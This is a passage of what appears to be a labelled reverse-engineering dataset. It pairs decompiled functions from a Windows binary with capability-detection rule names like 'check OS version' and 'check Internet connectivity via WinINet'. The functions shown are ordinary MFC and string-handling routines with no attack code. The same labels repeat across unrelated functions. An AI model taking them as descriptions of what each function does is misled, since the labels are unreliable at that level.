fcn.004161cc(*(unaff_EBP + 0xc), unaff_EBP + -0x26),  pcVar6 = _sym.imp.OLEAUT32.dll_VariantCopy, \n       cVar7 == '\\0')) {\n        fcn.004133f4(unaff_EBP + -0x40);\n        (*_sym.imp.OLEAUT32.dll_VariantCopy)(unaff_EBP + -0x40);\n        goto code_r0x00419d8b;\n    }\n    uVar3 = *(unaff_EBP + -0x26);\n    if (uVar3 < 0x82) {\n        if (uVar3 != 0x81) {\n            if (uVar3 < 9) {\n                if (uVar3 == 8) goto code_r0x00419d2e;\n                if (uVar3 == 2) {\ncode_r0x00419a7d:\n                    piVar11 = fcn.00416200(*(unaff_EBP + 0xc));\n                    uVar10 = fcn.004132a7(*piVar11, 2);\n                    *(unaff_EBP + -4) = 7;\n                    fcn.0041335e(uVar10);\n                    iVar13 = unaff_EBP + -0x110;\n                }\n                else if (uVar3 == 3) {\ncode_r0x00419a4c:\n                    puVar9 = fcn.00416200(*(unaff_EBP + 0xc));\n                    uVar10 = fcn.004132ce(*puVar9, 3);\n                    *(unaff_EBP + -4) = 8;\n                    fcn.0041335e(uVar10);\n                    iVar13 = unaff_EBP + -0xe0;\n                }\n                else if (uVar3 == 4) {\n                    puVar9 = fcn.00416200(*(unaff_EBP + 0xc));\n                    *(unaff_EBP + -0xb8) = *puVar9;\n                    *(unaff_EBP + -0xc0) = 4;\n                    *(unaff_EBP + -4) = 9;\n                    fcn.0041335e(unaff_EBP + -0xc0);\n                    iVar13 = unaff_EBP + -0xc0;\n                }\n                else if (uVar3 == 5) {\n                    puVar8 = fcn.00416200(*(unaff_EBP + 0xc));\n                    *(unaff_EBP + -0x88) = *puVar8;\n                    *(unaff_EBP + -0x90) = 5;\n                    *(unaff_EBP + -4) = 10;\n                    fcn.0041335e(unaff_EBP + -0x90);\n                    iVar13 = unaff_EBP + -0x90;\n                }\n                else if (uVar3 == 6) {\n                    puVar9 = fcn.00416200(*(unaff_EBP + 0xc));\n                    uVar10 = *puVar9;\n                    uVar4 = puVar9[1];\n                    *(unaff_EBP + -0x50) = 6;\n                    *(unaff_EBP + -0x48) = uVar10;\n                    *(unaff_EBP + -0x44) = uVar4;\n                    *(unaff_EBP + -4) = 0xd;\n                    fcn.0041335e(unaff_EBP + -0x50);\n                    iVar13 = unaff_EBP + -0x50;\n                }\n                else {\n                    if (uVar3 != 7) goto code_r0x00419d79;\n                    puVar8 = fcn.00416200(*(unaff_EBP + 0xc));\n                    *(unaff_EBP + -200) = *puVar8;\n                    *(unaff_EBP + -0xd0) = 7;\n                    *(unaff_EBP + -4) = 0xc;\n                    fcn.0041335e(unaff_EBP + -0xd0);\n                    iVar13 = unaff_EBP + -0xd0;\n                }\n            }\n            else if (uVar3 == 0xb) {\n                piVar11 = fcn.00416200(*(unaff_EBP + 0xc));\n                uVar10 = fcn.004132a7(*piVar11, 0xb);\n                *(unaff_EBP + -4) = 0xb;\n                fcn.0041335e(uVar10);\n                iVar13 = unaff_EBP + -0x100;\n            }\n            else {\n                if (uVar3 != 0xc) {\n                    if (0xf < uVar3) {\n                        if (uVar3 < 0x12) {\n                            puVar12 = fcn.00416200(*(unaff_EBP + 0xc));\n                            uVar2 = *puVar12;\n                            *(unaff_EBP + -0x60) = 0x11;\n                            *(unaff_EBP + -0x58) = uVar2;\n                            *(unaff_EBP + -4) = 6;\n                            fcn.0041335e(unaff_EBP + -0x60);\n                            iVar13 = unaff_EBP + -0x60;\n                            goto code_r0x00419c10;\n                        }\n                        if (uVar3 == 0x12) goto code_r0x00419a7d;\n                        if (uVar3 == 0x13) goto code_r0x00419a4c;\n                    }\n                    goto code_r0x00419d79;\n                }\n                uVar10 = fcn.00416200(*(unaff_EBP + 0xc));\n                uVar10 = fcn.004133f4(uVar10);\n                *(unaff_EBP + -4) = 1;\n                fcn.0041335e(uVar10);\n                iVar13 = unaff_EBP + -0xf0;\n            }\n            goto code_r0x00419c10;\n        }\n        uVar10 = fcn.00416200(*(unaff_EBP + 0xc));\n        puVar9 = fcn.00401cd0(uVar10);\n        uVar10 = *puVar9;\n        *(unaff_EBP + -4) = 2;\n        uVar10 = fcn.00413414(uVar10, 8);\n        *(unaff_EBP + -4) = 3;\n        fcn.0041335e(uVar10);\n        (*pcVar6)(unaff_EBP + -0x120);\ncode_r0x00419d6e:\n        *(unaff_EBP + -4) = 0;\n        fcn.004011b0();\n    }\n    else {\n        if (uVar3 == 0x82) {\ncode_r0x00419d2e:\n            uVar10 = fcn.00416200(*(unaff_EBP + 0xc));\n            puVar9 = fcn.00413587(uVar10);\n            uVar10 = *puVar9;\n            *(unaff_EBP + -4) = 4;\n            uVar10 = fcn.00413414(uVar10, 8);\n            *(unaff_EBP + -4) = 5;\n            fcn.0041335e(uVar10);\n            (*pcVar6)(unaff_EBP + -0x130);\n            goto code_r0x00419d6e;\n        }\n        if (uVar3 == 0x83) {\n            cVar7 = fcn.0041724b(*(unaff_EBP + 0xc), unaff_EBP + -0x24);\n            if (cVar7 != '\\0') {\n                dVar5 = *(unaff_EBP + -0x21);\n                cVar7 = *(unaff_EBP + -0x23);\n                while (cVar7 != '\\0') {\n                    pcVar1 = unaff_EBP + -0x23;\n                    *pcVar1 = *pcVar1 + -1;\n                    dVar5 = dVar5 * *0x43a248;\n                    cVar7 = *pcVar1;\n                }\n                if (*(unaff_EBP + -0x22) == '\\0') {\n                    dVar5 = -dVar5;\n                }\n                *(unaff_EBP + -0x78) = dVar5;\n                *(unaff_EBP + -0x80) = 5;\n                *(unaff_EBP + -4) = 0xe;\n                fcn.0041335e(unaff_EBP + -0x80);\n                iVar13 = unaff_EBP + -0x80;\n                goto code_r0x00419c10;\n            }\n        }\n        else if (uVar3 == 0x85) {\n            cVar7 = fcn.00417275(*(unaff_EBP + 0xc), unaff_EBP + -0x30);\n            if (cVar7 != '\\0') {\n                *(unaff_EBP + -0x20) = 0;\n                *(unaff_EBP + -0x18) = 0;\n                fcn.0041338b(*(unaff_EBP + -0x30), *(unaff_EBP + -0x2e), *(unaff_EBP + -0x2c), 0, 0, 0);\n                *(unaff_EBP + -0x70) = 7;\n                *(unaff_EBP + -0x68) = *(unaff_EBP + -0x20);\n                *(unaff_EBP + -4) = 0xf;\n                fcn.0041335e(unaff_EBP + -0x70);\n                iVar13 = unaff_EBP + -0x70;\n                goto code_r0x00419c10;\n            }\n        }\n        else if (uVar3 == 0x86) {\n            cVar7 = fcn.00417275(*(unaff_EBP + 0xc), unaff_EBP + -0x30);\n            if (cVar7 != '\\0') {\n                *(unaff_EBP + -0x20) = 0;\n                *(unaff_EBP + -0x18) = 0;\n                fcn.0041616c(*(unaff_EBP + -0x30), *(unaff_EBP + -0x2e), *(unaff_EBP + -0x2c));\n                *(unaff_EBP + -0xb0) = 7;\n                *(unaff_EBP + -0xa8) = *(unaff_EBP + -0x20);\n                *(unaff_EBP + -4) = 0x10;\n                fcn.0041335e(unaff_EBP + -0xb0);\n                iVar13 = unaff_EBP + -0xb0;\n                goto code_r0x00419c10;\n            }\n        }\n        else if ((uVar3 == 0x87) && (cVar7 = fcn.0041729f(*(unaff_EBP + 0xc), unaff_EBP + -0x24),  cVar7 != '\\0')) {\n            puVar8 = fcn.00417435(*(unaff_EBP + -0x24), *(unaff_EBP + -0x22), *(unaff_EBP + -0x20), *(unaff_EBP + -0x1e)\n                                  , *(unaff_EBP + -0x1c), *(unaff_EBP + -0x1a));\n            *(unaff_EBP + -0xa0) = 7;\n            *(unaff_EBP + -0x98) = *puVar8;\n            *(unaff_EBP + -4) = 0x11;\n            fcn.0041335e(unaff_EBP + -0xa0);\n            iVar13 = unaff_EBP + -0xa0;\ncode_r0x00419c10:\n            *(unaff_EBP + -4) = 0;\n            (*pcVar6)(iVar13);\n        }\n    }\ncode_r0x00419d79:\n    fcn.004133f4(unaff_EBP + -0x40);\n    (*pcVar6)(unaff_EBP + -0x40);\ncode_r0x00419d8b:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    fcn.0041c6de();\n    return;\n}\n",
        "token_count": 3201
    },
    "0041a162": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0041a162(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if (*param_1 == 0) {\n        if ((param_1[1] != 0) && (uVar2 = (**(*param_1[1] + 0x78))(),  (uVar2 & 0x8000000) != 0)) {\n            return 0;\n        }\n    }\n    else {\n        iVar1 = (*_sym.imp.USER32.dll_IsWindowEnabled)(*param_1);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    if ((param_1[1] != 0) && ((*(param_1[1] + 0x6d) & 0x20) != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 200
    },
    "0041a35b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0041a35b(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t **ppiVar3;\n    \n    piVar2 = fcn.0042a4d8();\n    if (piVar2 != NULL) {\n        iVar1 = piVar2[0x10];\n        do {\n            if (iVar1 == 0) {\n                return NULL;\n            }\n            ppiVar3 = fcn.00411acd();\n            piVar2 = *ppiVar3;\n        } while (*piVar2 != *(arg_ch + 0x1c));\n    }\n    return piVar2;\n}\n",
        "token_count": 160
    },
    "0041a39c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0041a39c(uint arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t **ppiVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t *piVar7;\n    \n    piVar7 = arg_ch;\n    arg_ch = NULL;\n    piVar3 = piVar7;\n    if ((piVar7 != NULL) && (*piVar7 != 0)) {\n        uVar1 = fcn.0042aeb1(*piVar7);\n        iVar2 = fcn.0041a22c(arg_8h, uVar1);\n        if (iVar2 != 0) {\n            piVar3 = fcn.0041a35b(arg_8h, iVar2);\n        }\n    }\n    while (((piVar3 = fcn.0042d2c3(piVar3),  piVar3 != NULL && (arg_ch = arg_ch + 1,  piVar3 != piVar7)) &&\n           (arg_ch < 0x3d))) {\n        iVar2 = fcn.0041a143(piVar3, arg_10h);\n        if (iVar2 != 0) {\n            return piVar3;\n        }\n    }\n    iVar2 = fcn.0042a4d8();\n    if (iVar2 != 0) {\n        arg_ch = *(iVar2 + 0x40);\n        if (piVar7 == NULL) {\n            ppiVar4 = fcn.00411acd(&arg_ch);\n            piVar3 = *ppiVar4;\n            piVar7 = piVar3;\n        }\n        else {\n            piVar3 = NULL;\n            if (arg_ch == NULL) {\n                return NULL;\n            }\n            do {\n                if (piVar3 == piVar7) break;\n                ppiVar4 = fcn.00411acd();\n                piVar3 = *ppiVar4;\n            } while (arg_ch != NULL);\n        }\n        if (((arg_ch != NULL) && (piVar3 != NULL)) && (piVar7 != NULL)) {\n            do {\n                if (arg_ch == NULL) {\n                    arg_ch = *(iVar2 + 0x40);\n                }\n                ppiVar4 = fcn.00411acd(&arg_ch);\n                piVar3 = *ppiVar4;\n                iVar5 = fcn.0041a143(piVar3, arg_10h);\n                if (iVar5 != 0) {\n                    if (*piVar3 == 0) {\n                        uVar6 = (**(*piVar3[1] + 0x78))();\n                        if ((uVar6 & 0x8000000) == 0) {\n                            return piVar3;\n                        }\n                    }\n                    else {\n                        iVar5 = (*_sym.imp.USER32.dll_IsWindowEnabled)(*piVar3);\n                        if (iVar5 != 0) {\n                            return piVar3;\n                        }\n                    }\n                }\n            } while (piVar3 != piVar7);\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 698
    },
    "0041a4b9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0041a4b9(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t **ppiVar3;\n    int32_t iVar4;\n    int32_t *arg_ch_00;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    piVar1 = fcn.0041a35b(arg_8h, arg_ch);\n    arg_ch_00 = piVar1;\n    if ((piVar1 == NULL) && (iVar2 = fcn.0042a4d8(),  iVar2 != 0)) {\n        iVar5 = *(iVar2 + 0x40);\n        while (arg_ch_00 = piVar1,  iVar5 != 0) {\n            ppiVar3 = fcn.00411acd();\n            arg_ch_00 = *ppiVar3;\n            if (((*arg_ch_00 != 0) && (iVar4 = (*_sym.imp.USER32.dll_GetFocus)(),  *arg_ch_00 == iVar4)) ||\n               ((arg_ch_00[1] != 0 && (arg_ch_00[1] == *(iVar2 + 0x6c))))) break;\n        }\n    }\n    iVar2 = 0;\n    do {\n        arg_ch_00 = fcn.0041a39c(arg_8h, arg_ch_00, arg_10h);\n        if (arg_ch_00 == NULL) {\n            return NULL;\n        }\n        iVar5 = fcn.0041a162(arg_ch_00);\n        if ((iVar5 != 0) && (arg_ch_00 = fcn.0042d0eb(arg_ch_00, 0),  arg_ch_00 == NULL)) {\n            return NULL;\n        }\n        if (*arg_ch_00 == 0) {\n            uVar6 = (**(*arg_ch_00[1] + 0x78))();\n            uVar6 = uVar6 & 0x8000000;\n        }\n        else {\n            uVar6 = (*_sym.imp.USER32.dll_IsWindowEnabled)(*arg_ch_00);\n        }\n        if (uVar6 == 0) {\n            return arg_ch_00;\n        }\n        if (arg_ch_00 == var_4h) {\n            return NULL;\n        }\n        if (var_4h == NULL) {\n            var_4h = arg_ch_00;\n        }\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x200);\n    return NULL;\n}\n",
        "token_count": 594
    },
    "0042cf7f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042cf7f(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x4c) == 0) {\n        uVar1 = (*_sym.imp.USER32.dll_SetFocus)(*(param_1 + 0x1c));\n        fcn.0042aeb1(uVar1);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042cf9a. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0xb0))();\n    return;\n}\n",
        "token_count": 149
    },
    "0041a7af": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041a7af(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    iVar1 = fcn.0041a1e6(arg_10h);\n    if (iVar1 == 0) {\n        return;\n    }\n    if (arg_10h != 0) {\n        uVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)(*(arg_10h + 0x1c), 0xffffffec);\n        if ((uVar2 & 0x10000) != 0) {\n            return;\n        }\n        var_4h = fcn.0041a1a3(arg_10h);\n    }\n    if (arg_ch == arg_10h) {\n        if ((var_4h & 0x20) == 0) {\n            return;\n        }\n        if (arg_ch == 0) goto code_r0x0041a881;\n        iVar1 = arg_8h;\n        uVar3 = fcn.0041a782(arg_8h);\n        iVar4 = fcn.0041a67c(arg_8h, uVar3);\n        if (((iVar4 == 0) || (iVar4 == arg_10h)) || (uVar2 = fcn.0041a1a3(iVar4),  (uVar2 & 0x10) == 0))\n        goto code_r0x0041a881;\ncode_r0x0041a848:\n        fcn.0041a720(arg_8h, iVar1);\n    }\n    else {\n        iVar1 = arg_10h;\n        if (((arg_ch != 0) && (iVar4 = fcn.0041a1a3(arg_ch),  iVar4 != 0)) || ((arg_10h != 0 && (var_4h != 0))))\n        goto code_r0x0041a848;\n    }\n    if ((var_4h & 0x30) == 0) {\n        uVar3 = fcn.0041a782(arg_8h);\n        arg_10h = fcn.0041a67c(arg_8h, uVar3);\n        uVar2 = fcn.0041a1a3(arg_10h);\n        if ((uVar2 & 0x20) == 0) {\n            return;\n        }\n        iVar1 = fcn.0042cf43();\n        if (iVar1 == 0) {\n            return;\n        }\n    }\ncode_r0x0041a881:\n    fcn.0041a6d3(arg_10h);\n    return;\n}\n",
        "token_count": 631
    },
    "0041acff": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041acff(code **param_1)\n\n{\n    uint uVar1;\n    \n    *param_1 = vtable.CMenu.0;\n    if (param_1[1] == NULL) {\n        return 0;\n    }\n    uVar1 = fcn.0042e4c8();\n    uVar1 = (*_sym.imp.USER32.dll_DestroyMenu)(uVar1);\n    return uVar1;\n}\n",
        "token_count": 99
    },
    "0041ae3c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041ae3c(uint32_t *param_1, uint32_t param_2, uint32_t param_3)\n\n{\n    if (param_2 < 4) {\n        param_2 = 4;\n    }\n    if (param_3 < 2) {\n        param_3 = 0x40;\n    }\n    param_1[3] = 0;\n    param_1[2] = 0;\n    *param_1 = param_2;\n    param_1[1] = param_3;\n    return;\n}\n",
        "token_count": 128
    },
    "0041ae80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041ae80(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    if (param_1[3] == 0) {\n        iVar1 = fcn.00427e55(param_1 + 2, param_1[1], *param_1);\n        iVar3 = param_1[1];\n        piVar2 = iVar1 + 4 + *param_1 * (iVar3 + -1);\n        if (-1 < iVar3 + -1) {\n            do {\n                *piVar2 = param_1[3];\n                param_1[3] = piVar2;\n                piVar2 = piVar2 - *param_1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n    }\n    param_1[3] = *param_1[3];\n    return;\n}\n",
        "token_count": 216
    },
    "0041af1f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint8_t * __cdecl fcn.0041af1f(uint8_t *arg_8h, char *arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint8_t *puVar9;\n    uint var_4h;\n    \n    iVar2 = fcn.0041e005();\n    iVar2 = *(iVar2 + 0x60);\n    if (iVar2 != *0x44acc8) {\n        iVar2 = fcn.0041d16e();\n    }\n    if (*(iVar2 + 8) == 0) {\n        puVar3 = fcn.0041e2b0(arg_8h, arg_ch);\n        return puVar3;\n    }\n    if (*arg_ch == '\\0') {\n        return arg_8h;\n    }\n    iVar4 = fcn.0041c6f0(arg_ch);\n    iVar5 = fcn.0041c6f0(arg_8h);\n    if (*arg_8h != 0) {\n        iVar7 = arg_8h - arg_ch;\n        puVar3 = arg_8h;\n        do {\n            if (arg_8h + (iVar5 - iVar4) < puVar3) {\n                return NULL;\n            }\n            pcVar6 = arg_ch;\n            uVar1 = *puVar3;\n            while (uVar1 != 0) {\n                if (*pcVar6 == '\\0') {\n                    return puVar3;\n                }\n                if (pcVar6[iVar7] != *pcVar6) break;\n                pcVar6 = pcVar6 + 1;\n                uVar1 = pcVar6[iVar7];\n            }\n            if (*pcVar6 == '\\0') {\n                return puVar3;\n            }\n            puVar9 = puVar3 + 1;\n            iVar8 = iVar7 + 1;\n            if ((*(*puVar3 + 0x1d + iVar2) & 4) != 0) {\n                if (*puVar9 == 0) {\n                    return NULL;\n                }\n                puVar9 = puVar3 + 2;\n                iVar8 = iVar7 + 2;\n            }\n            iVar7 = iVar8;\n            puVar3 = puVar9;\n        } while (*puVar9 != 0);\n    }\n    return NULL;\n}\n",
        "token_count": 553
    },
    "0041afd1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint8_t * __cdecl fcn.0041afd1(uint8_t *arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint8_t uVar5;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint8_t *noname_2;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    uint in_stack_00000008;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint in_stack_00000038;\n    \n    iVar3 = fcn.0041e005();\n    iVar3 = *(iVar3 + 0x60);\n    if (iVar3 != *0x44acc8) {\n        iVar3 = fcn.0041d16e();\n    }\n    puVar2 = arg_8h;\n    uVar1 = *arg_8h;\n    noname_2 = arg_8h;\n    do {\n        if (uVar1 == 0) {\n            return puVar2;\n        }\n        uVar5 = *noname_2;\n        uVar1 = *(uVar5 + iVar3 + 0x1d);\n        if ((uVar1 & 4) == 0) {\n            if ((uVar1 & 0x20) != 0) {\n                uVar5 = *(uVar5 + iVar3 + 0x11d);\n            }\n            *noname_2 = uVar5;\n        }\n        else {\n            iVar4 = fcn.0041e336(*(iVar3 + 0xc), 0x200, noname_2, 2, &arg_8h, 2, *(iVar3 + 4), 1, unaff_EDI, unaff_ESI, \n                                 unaff_EBX, unaff_EBP, unaff_retaddr, arg_8h, in_stack_00000008, in_stack_0000000c, \n                                 in_stack_00000010, in_stack_00000014, in_stack_00000018, in_stack_0000001c, \n                                 in_stack_00000020, in_stack_00000024, in_stack_00000028, in_stack_0000002c, \n                                 in_stack_00000030, in_stack_00000034, in_stack_00000038);\n            if (iVar4 == 0) {\n                return NULL;\n            }\n            *noname_2 = arg_8h;\n            if (1 < iVar4) {\n                noname_2 = noname_2 + 1;\n                *noname_2 = arg_8h >> 8;\n            }\n        }\n        noname_2 = noname_2 + 1;\n        uVar1 = *noname_2;\n    } while( true );\n}\n",
        "token_count": 721
    },
    "0041b056": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041b056(uint *arg_8h, uint8_t *arg_ch)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint8_t uVar4;\n    uint16_t uVar5;\n    int32_t iVar6;\n    uint16_t uVar7;\n    uint8_t *puVar8;\n    bool bVar9;\n    \n    iVar6 = fcn.0041e005();\n    iVar6 = *(iVar6 + 0x60);\n    if (iVar6 != *0x44acc8) {\n        iVar6 = fcn.0041d16e();\n    }\n    if (*(iVar6 + 8) != 0) {\n        while( true ) {\n            uVar4 = *arg_8h;\n            uVar5 = uVar4;\n            puVar3 = arg_8h + 1;\n            if ((*(uVar4 + 0x1d + iVar6) & 4) != 0) {\n                if (*puVar3 == 0) {\n                    uVar5 = 0;\n                }\n                else {\n                    uVar5 = CONCAT11(uVar4, *puVar3);\n                    puVar3 = arg_8h + 2;\n                }\n            }\n            arg_8h = puVar3;\n            uVar4 = *arg_ch;\n            uVar7 = uVar4;\n            puVar8 = arg_ch + 1;\n            if ((*(uVar4 + 0x1d + iVar6) & 4) != 0) {\n                uVar1 = *puVar8;\n                if (uVar1 == 0) {\n                    uVar7 = 0;\n                }\n                else {\n                    puVar8 = arg_ch + 2;\n                    uVar7 = CONCAT11(uVar4, uVar1);\n                }\n            }\n            if (uVar7 != uVar5) break;\n            arg_ch = puVar8;\n            if (uVar5 == 0) {\n                return 0;\n            }\n        }\n        return (-(uVar7 < uVar5) & 2) - 1;\n    }\n    if ((arg_8h & 3) != 0) {\n        if ((arg_8h & 1) != 0) {\n            uVar4 = *arg_8h;\n            arg_8h = arg_8h + 1;\n            bVar9 = uVar4 < *arg_ch;\n            if (uVar4 != *arg_ch) goto code_r0x0041e744;\n            arg_ch = arg_ch + 1;\n            if (uVar4 == 0) {\n                return 0;\n            }\n            if ((arg_8h & 2) == 0) goto code_r0x0041e710;\n        }\n        uVar5 = *arg_8h;\n        arg_8h = arg_8h + 2;\n        uVar4 = uVar5;\n        bVar9 = uVar4 < *arg_ch;\n        if (uVar4 != *arg_ch) goto code_r0x0041e744;\n        if (uVar4 == 0) {\n            return 0;\n        }\n        uVar4 = uVar5 >> 8;\n        bVar9 = uVar4 < arg_ch[1];\n        if (uVar4 != arg_ch[1]) goto code_r0x0041e744;\n        if (uVar4 == 0) {\n            return 0;\n        }\n        arg_ch = arg_ch + 2;\n    }\ncode_r0x0041e710:\n    while( true ) {\n        uVar2 = *arg_8h;\n        uVar4 = uVar2;\n        bVar9 = uVar4 < *arg_ch;\n        if (uVar4 != *arg_ch) break;\n        if (uVar4 == 0) {\n            return 0;\n        }\n        uVar4 = uVar2 >> 8;\n        bVar9 = uVar4 < arg_ch[1];\n        if (uVar4 != arg_ch[1]) break;\n        if (uVar4 == 0) {\n            return 0;\n        }\n        uVar4 = uVar2 >> 0x10;\n        bVar9 = uVar4 < arg_ch[2];\n        if (uVar4 != arg_ch[2]) break;\n        if (uVar4 == 0) {\n            return 0;\n        }\n        uVar4 = uVar2 >> 0x18;\n        bVar9 = uVar4 < arg_ch[3];\n        if (uVar4 != arg_ch[3]) break;\n        arg_ch = arg_ch + 4;\n        arg_8h = arg_8h + 1;\n        if (uVar4 == 0) {\n            return 0;\n        }\n    }\ncode_r0x0041e744:\n    return bVar9 * -2 + 1;\n}\n",
        "token_count": 1093
    },
    "0041b527": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0041b527(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint arg_8h, uint arg_ch, uint noname_16, uint noname_17, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_34h;\n    uint *var_30h;\n    uint var_2ch;\n    uint *var_28h_2;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc4;\n    if (var_8h_3 == 0x123) {\n        *var_ch_2 = 0x41b5c2;\n        var_34h = 